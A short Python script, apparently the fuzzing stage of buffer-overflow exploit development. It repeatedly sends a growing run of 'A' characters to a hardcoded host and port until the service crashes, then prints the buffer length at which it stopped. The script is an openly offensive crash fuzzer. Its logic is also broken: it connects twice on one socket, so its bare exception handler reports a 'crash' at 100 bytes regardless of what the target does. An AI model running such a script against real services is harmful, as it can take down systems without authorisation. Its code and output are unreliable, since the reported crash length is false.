#!/usr/bin/python

#once the program crashes in Windows, CLOSE it manually or this PROGRAM may keep running forever

import sys,socket
from time import sleep

buffer = "A"*100
ip = '192.168.10.51'
port = 2371
while True:
    try:
        print ("Sending buffer of length " + str(len(buffer)) )
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.settimeout(2)
        res = s.connect_ex((ip,port))
        
        if res == 0:
            print("The Port is open\n")
               
        else:
            print("The Port is closed\n")
            s.close()
            sys.exit()



        res = s.connect((ip,port))
        buffer = buffer + "A"*250
        s.send((buffer))
        s.close()
        sleep(2)


    except:
        print ("Program crashed at %s bytes" %str(len(buffer)))
        sys.exit()
